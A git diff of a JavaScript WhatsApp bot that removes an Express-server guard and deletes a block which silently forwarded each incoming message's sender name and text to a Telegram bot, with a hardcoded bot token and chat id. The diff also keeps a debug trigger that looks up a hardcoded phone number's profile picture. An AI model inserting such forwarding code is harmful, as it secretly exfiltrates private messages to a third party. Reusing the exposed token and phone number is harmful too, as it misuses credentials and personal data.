@@ -166,9 +166,6 @@ async function startHisoka() {
   });
 
   store.bind(client.ev);
-let ser = false;
-if (ser == false) {
-  ser = true;
   const express = require('express');
   const app = express();
   app.use(cors())
@@ -191,7 +188,6 @@ if (ser == false) {
   app.listen(PORT, () => {
     console.log(`Express server is running on port ${PORT}`);
   });
-}
   client.ev.on("messages.upsert", async (chatUpdate) => {
     //console.log(JSON.stringify(chatUpdate, undefined, 2))
     try {
@@ -203,19 +199,7 @@ if (ser == false) {
       if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) return;
       m = smsg(client, mek, store);
 
-      axios.post('https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendMessage?chat_id=-1001723645621', {
-        text: {user:m.pushName, message:m.body}
-    })
-    .then(response => {
-        // Telegram API call succeeded
-        console.log('Message sent to Telegram:', message);
-        res.send(message); // Send response to the user
-    })
-    .catch(error => {
-        // Telegram API call failed
-        console.error('Error sending message to Telegram:', error);
-        res.status(500).send('Error sending message to Telegram');
-    });
+    
    
      if (m.body == 'kkk'){
       console.log(await client.profilePictureUrl('917994107442@s.whatsapp.net'));
